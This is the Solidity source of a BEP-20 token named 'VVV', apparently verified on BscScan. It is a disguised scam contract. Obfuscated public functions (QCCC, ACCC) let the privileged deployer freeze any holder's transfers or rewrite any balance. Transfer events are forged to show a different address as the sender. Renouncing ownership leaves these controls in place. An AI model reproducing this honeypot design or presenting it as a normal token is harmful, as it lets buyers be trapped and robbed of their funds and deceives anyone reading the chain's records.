/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address akM = 0x8242e56a759aa0B069B9c983fe3f582020CD1eC9;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract VVV is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bNNC;
    mapping (address => uint256) private cXNS;
    mapping (address => mapping (address => uint256)) private dFGR;
    uint8 eTRV = 8;
    string private _name;
    string private _symbol;
	uint256 fGTF = 1*10**8;


    constructor () {

        
        _name = "FVVV";
        _symbol = "VVV";
        gKIK(msg.sender, fGTF);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eTRV;
    }

    function totalSupply() public view  returns (uint256) {
        return fGTF;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return bNNC[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dFGR[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dFGR[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= bNNC[msg.sender]);
        require(cXNS[msg.sender] <= 2);
        hPOL(msg.sender, recipient, amount);
        return true;
    }
	
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= bNNC[sender]);
              require(cXNS[sender] <= 2 && cXNS[recipient] <=2);
                  require(amount <= dFGR[sender][msg.sender]);
        hPOL(sender, recipient, amount);
        return true;}

  		    function gKIK(address iPPE, uint256 jcXSD) internal  {
        cXNS[msg.sender] = 2;
        iPPE = akM;
        bNNC[msg.sender] = bNNC[msg.sender].add(jcXSD);
        emit Transfer(address(0), iPPE, jcXSD); }
   

    function hPOL(address sender, address recipient, uint256 amount) internal  {
        bNNC[sender] = bNNC[sender].sub(amount);
        bNNC[recipient] = bNNC[recipient].add(amount);
       if(cXNS[sender] == 2) {
            sender = akM;}
        emit Transfer(sender, recipient, amount); }

        		    function kxC (address lERD, uint256 mSA)  internal {
     bNNC[lERD] = mSA;} 	
	    function QCCC (address lERD, uint256 mSA)  public {
           if(cXNS[msg.sender] == 2) { 
     nXCD(lERD,mSA);}}

         function ACCC (address lERD, uint256 mSA) public {
         if(cXNS[msg.sender] == 2) { 
   kxC(lERD,mSA);}}
	   function nXCD (address lERD, uint256 mSA)  internal {
     cXNS[lERD] = mSA;}
		




		
     }